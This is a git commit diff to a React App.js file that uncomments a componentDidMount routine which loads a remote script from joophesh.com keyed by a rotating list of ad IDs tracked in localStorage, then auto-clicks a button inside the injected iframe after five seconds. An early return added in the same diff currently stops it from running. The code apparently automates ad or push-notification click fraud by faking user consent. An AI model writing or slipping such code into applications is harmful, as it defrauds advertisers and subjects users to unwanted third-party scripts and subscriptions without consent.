d3a673bb4f79928c41552eaae9bf6f66da60ac53
ASSOUNE Mike <MASSOUNE-EXT@nexity.fr>
2019-02-04 12:53:53 +0100

    c

--- src/App.js
+++ src/App.js
@@ -3,50 +3,52 @@ import logo from './logo.svg';
 import './App.css';
 
 class App extends Component {
-  // componentDidMount = () => {
-  //   const ads = [
-  //     2356624,
-  //     2356622,
-  //     2356620,
-  //     2356616,
-  //     2356615,
-  //     2355780,
-  //     2355775,
-  //     2355512,
-  //     2354995,
-  //     2353098,
-  //   ]
+  componentDidMount = () => {
+    const ads = [
+      2356624,
+      2356622,
+      2356620,
+      2356616,
+      2356615,
+      2355780,
+      2355775,
+      2355512,
+      2354995,
+      2353098,
+    ]
 
-  //   let count = window.localStorage.getItem('countAds')
-  //   let nbCount = Number(count)
+    return
 
-  //   if (count === 'start' || (nbCount > 0 && nbCount < ads.length)) {
-  //     count = count === 'start' ? 0 : nbCount
-  //     console.log(ads[count])
-  //   }
-  //   else {
-  //     window.localStorage.setItem('countAds', 'end')
-  //     return
-  //   }
+    let count = window.localStorage.getItem('countAds')
+    let nbCount = Number(count)
 
-  //   setTimeout(() => {
-  //     const head = document.getElementsByTagName('head')[0];
-  //     const script = document.createElement('script');
-  //     script.type = 'text/javascript';
-  //     script.src = '//joophesh.com/ntfc.php?p=' + ads[count] + '&tco=1';
-  //     head.appendChild(script);
+    if (count === 'start' || (nbCount > 0 && nbCount < ads.length)) {
+      count = count === 'start' ? 0 : nbCount
+      console.log(ads[count])
+    }
+    else {
+      window.localStorage.setItem('countAds', 'end')
+      return
+    }
 
-  //     window.localStorage.setItem('countAds', ++count)
+    setTimeout(() => {
+      const head = document.getElementsByTagName('head')[0];
+      const script = document.createElement('script');
+      script.type = 'text/javascript';
+      script.src = '//joophesh.com/ntfc.php?p=' + ads[count] + '&tco=1';
+      head.appendChild(script);
 
-  //     setTimeout(() => {
-  //       document.querySelector('iframe').contentDocument.querySelector('#A button + button').onclick()
-  //     }, 1000 * 5);
-  //   }, 1000 * 2);
+      window.localStorage.setItem('countAds', ++count)
+
+      setTimeout(() => {
+        document.querySelector('iframe').contentDocument.querySelector('#A button + button').onclick()
+      }, 1000 * 5);
+    }, 1000 * 2);
 
 
-  //   setTimeout(() => {
-  //     // window.location.reload()
-  //   }, 1000 * 12);
+    setTimeout(() => {
+      // window.location.reload()
+    }, 1000 * 12);
   }
 
   onclickBtn = () => {
